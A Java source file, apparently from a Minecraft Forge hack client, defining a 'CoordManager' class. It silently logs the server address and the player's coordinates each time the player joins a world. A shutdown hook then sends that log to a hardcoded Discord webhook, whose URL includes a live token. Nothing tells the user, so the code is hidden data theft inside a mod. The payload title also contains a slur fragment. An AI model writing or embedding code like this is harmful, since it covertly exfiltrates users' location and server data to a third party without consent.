package xyz.maywr.hack.client.managers;

import net.minecraft.entity.player.EntityPlayer;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent;
import xyz.maywr.hack.api.interfaces.Minecraftable;

import javax.net.ssl.HttpsURLConnection;
import java.io.OutputStream;
import java.net.URL;

public class CoordManager implements Minecraftable {

    private String coord;
    private final StringBuilder sb = new StringBuilder();

    public CoordManager () {
        this.init();
    }

    public void init () {
        //sb.append(mc.player.getName() + " session\n\n");
        MinecraftForge.EVENT_BUS.register(this);
        Runtime.getRuntime().addShutdownHook(new Threadie());
    }

    @SubscribeEvent
    public void onServerJoined (EntityJoinWorldEvent event) {
        if (event.getEntity() == mc.player) {
            String format = mc.getCurrentServerData().serverIP + " - " + mc.player.getPosition().getX() + " " + mc.player.getPosition().getY() + " " + mc.player.getPosition().getZ();
            sb.append(format + "\n");
        }
    }

    class Threadie extends Thread {

        @Override
        public void run() {

            String jsonBrut = "{\"embeds\": [{"
                    + "\"title\": \"" + "nig" + "\","
                    + "\"description\": \"" + sb.toString() + "\","
                    + "\"color\": 15258703"
                    + "}]}";
            try {
                URL url = new URL("https://discordapp.com/api/webhooks/941302303573540894/mckf9tubEZ-mlabBN3qX8Q01LqfuVwb3TDtZOp4CsYWKw-mATC8b7qHDGKNQ5FSU-P-t");
                HttpsURLConnection con;
                con = (HttpsURLConnection) url.openConnection();
                con.addRequestProperty("Content-Type", "application/json");
                con.addRequestProperty("User-Agent", "Java-DiscordWebhook-BY-Gelox_");
                con.setDoOutput(true);
                con.setRequestMethod("POST");
                OutputStream stream = con.getOutputStream();
                stream.write(jsonBrut.getBytes());
                stream.flush();
                stream.close();
                con.getInputStream().close();
                con.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
